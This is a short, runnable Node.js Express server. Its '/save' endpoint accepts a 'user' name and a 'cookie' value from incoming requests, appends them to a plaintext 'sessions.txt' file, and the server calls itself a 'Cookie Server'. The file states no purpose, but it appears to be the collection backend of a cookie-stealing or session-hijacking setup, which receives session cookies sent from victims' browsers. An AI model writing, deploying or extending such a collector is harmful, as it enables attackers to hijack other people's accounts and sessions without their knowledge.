const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");

const app = express();
const port = process.env.PORT || 3000;

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

app.post("/save", (req, res) => {
    const user = req.body.user;
    const cookie = req.body.cookie;

    if (!user || !cookie) {
        return res.json({ status: "error", message: "missing data" });
    }

    const data = `user: ${user} | cookie: ${cookie}\n`;
    fs.appendFileSync("sessions.txt", data);

    res.json({ status: "ok", message: "session saved" });
});

app.get("/", (req, res) => {
    res.send("Cookie Server Running");
});

app.listen(port, () => {
    console.log("Server started on port " + port);
});
